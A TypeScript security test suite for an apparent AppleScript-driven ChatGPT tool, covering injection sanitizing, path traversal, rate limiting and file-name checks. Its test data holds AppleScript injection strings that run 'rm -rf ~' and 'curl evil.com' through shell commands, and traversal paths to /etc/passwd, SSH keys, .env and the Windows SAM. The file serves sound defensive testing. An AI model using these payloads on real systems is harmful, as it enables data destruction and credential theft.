/**
 * Security test utilities to validate security fixes
 */

import { sanitizeForAppleScript, validateSavePath, globalRateLimiter } from '../utils/security.js';
import { downloadImageFromChatGPT } from '../utils/file-system.js';
import { askChatGPT } from '../services/chatgpt.js';

/**
 * Test AppleScript injection protection
 */
export function testAppleScriptSanitization(): boolean {
  console.log('Testing AppleScript injection protection...');
  
  const maliciousInputs = [
    '"; do shell script "rm -rf ~"; keystroke "',
    '" & (do shell script "curl evil.com") & "',
    'test"; delay 5; keystroke "malicious',
    'normal\"; do shell script \"whoami',
    '\\"; system("malicious_command"); \\"'
  ];
  
  let allSafe = true;
  
  for (const input of maliciousInputs) {
    try {
      const sanitized = sanitizeForAppleScript(input);
      
      // Check that dangerous patterns are escaped/removed
      if (sanitized.includes('do shell script') || 
          sanitized.includes('; ') ||
          sanitized.includes('system(') ||
          sanitized.includes('\\";')) {
        console.error(`❌ Failed to sanitize: ${input}`);
        console.error(`   Result: ${sanitized}`);
        allSafe = false;
      } else {
        console.log(`✅ Sanitized: ${input.substring(0, 30)}...`);
      }
    } catch (error) {
      console.log(`✅ Rejected malicious input: ${input.substring(0, 30)}...`);
    }
  }
  
  return allSafe;
}

/**
 * Test path traversal protection
 */
export function testPathTraversalProtection(): boolean {
  console.log('Testing path traversal protection...');
  
  const maliciousPaths = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '/etc/passwd',
    'C:\\Windows\\System32\\config\\SAM',
    '../../../../home/user/.ssh/id_rsa',
    '../.env',
    '../../package.json',
    './../../../etc/hosts'
  ];
  
  const allowedDir = '/safe/directory';
  let allBlocked = true;
  
  for (const path of maliciousPaths) {
    try {
      const validated = validateSavePath(path, allowedDir);
      console.error(`❌ Path traversal not blocked: ${path} -> ${validated}`);
      allBlocked = false;
    } catch (error) {
      console.log(`✅ Blocked path traversal: ${path}`);
    }
  }
  
  // Test valid paths work
  try {
    const validPath = validateSavePath('/safe/directory/image.png', '/safe/directory');
    console.log(`✅ Valid path accepted: ${validPath}`);
  } catch (error) {
    console.error(`❌ Valid path rejected: ${error}`);
    allBlocked = false;
  }
  
  return allBlocked;
}

/**
 * Test rate limiting functionality
 */
export async function testRateLimiting(): Promise<boolean> {
  console.log('Testing rate limiting...');
  
  const testKey = 'security_test';
  let rateLimitTriggered = false;
  
  // Test normal requests
  for (let i = 0; i < 3; i++) {
    if (!globalRateLimiter.isAllowed(testKey)) {
      console.error(`❌ Rate limit triggered too early at request ${i + 1}`);
      return false;
    }
  }
  
  // Test rate limit trigger (assuming 5 requests per minute limit)
  for (let i = 0; i < 10; i++) {
    if (!globalRateLimiter.isAllowed(testKey)) {
      rateLimitTriggered = true;
      console.log(`✅ Rate limit triggered after ${i + 3} requests`);
      break;
    }
  }
  
  if (!rateLimitTriggered) {
    console.error('❌ Rate limit never triggered');
    return false;
  }
  
  return true;
}

/**
 * Test input validation
 */
export function testInputValidation(): boolean {
  console.log('Testing input validation...');
  
  const invalidInputs = [
    null,
    undefined,
    '',
    '   ',
    'x'.repeat(5000), // Too long
    '\x00\x01\x02', // Control characters
    123, // Wrong type
    {}, // Wrong type
    []  // Wrong type
  ];
  
  let allRejected = true;
  
  for (const input of invalidInputs) {
    try {
      sanitizeForAppleScript(input as any);
      console.error(`❌ Invalid input not rejected: ${typeof input === 'string' ? input.substring(0, 20) : typeof input}`);
      allRejected = false;
    } catch (error) {
      console.log(`✅ Invalid input rejected: ${typeof input === 'string' ? input.substring(0, 20) : typeof input}`);
    }
  }
  
  return allRejected;
}

/**
 * Test file validation
 */
export function testFileValidation(): boolean {
  console.log('Testing file validation...');
  
  const invalidFiles = [
    'script.js',
    'malware.exe',
    'config.php',
    '.hidden',
    '',
    'x'.repeat(300), // Too long filename
    '../traversal.png'
  ];
  
  const allowedDir = '/safe/directory';
  let allRejected = true;
  
  for (const filename of invalidFiles) {
    try {
      const fullPath = allowedDir + '/' + filename;
      validateSavePath(fullPath, allowedDir);
      console.error(`❌ Invalid file not rejected: ${filename}`);
      allRejected = false;
    } catch (error) {
      console.log(`✅ Invalid file rejected: ${filename}`);
    }
  }
  
  // Test valid files are accepted
  const validFiles = ['image.png', 'photo.jpg', 'picture.gif'];
  for (const filename of validFiles) {
    try {
      const fullPath = allowedDir + '/' + filename;
      validateSavePath(fullPath, allowedDir);
      console.log(`✅ Valid file accepted: ${filename}`);
    } catch (error) {
      console.error(`❌ Valid file rejected: ${filename}`);
      allRejected = false;
    }
  }
  
  return allRejected;
}

/**
 * Run all security tests
 */
export async function runSecurityTests(): Promise<boolean> {
  console.log('🔒 Running Security Test Suite...\n');
  
  const tests = [
    { name: 'AppleScript Injection Protection', test: testAppleScriptSanitization },
    { name: 'Path Traversal Protection', test: testPathTraversalProtection },
    { name: 'Rate Limiting', test: testRateLimiting },
    { name: 'Input Validation', test: testInputValidation },
    { name: 'File Validation', test: testFileValidation }
  ];
  
  let allPassed = true;
  const results: { name: string; passed: boolean }[] = [];
  
  for (const { name, test } of tests) {
    console.log(`\n--- Testing ${name} ---`);
    try {
      const passed = await test();
      results.push({ name, passed });
      if (!passed) {
        allPassed = false;
      }
    } catch (error) {
      console.error(`❌ Test failed with error: ${error}`);
      results.push({ name, passed: false });
      allPassed = false;
    }
  }
  
  // Print summary
  console.log('\n🔒 Security Test Results:');
  console.log('========================');
  for (const { name, passed } of results) {
    console.log(`${passed ? '✅' : '❌'} ${name}`);
  }
  
  console.log(`\n${allPassed ? '🎉 All security tests passed!' : '⚠️  Some security tests failed!'}`);
  
  return allPassed;
}
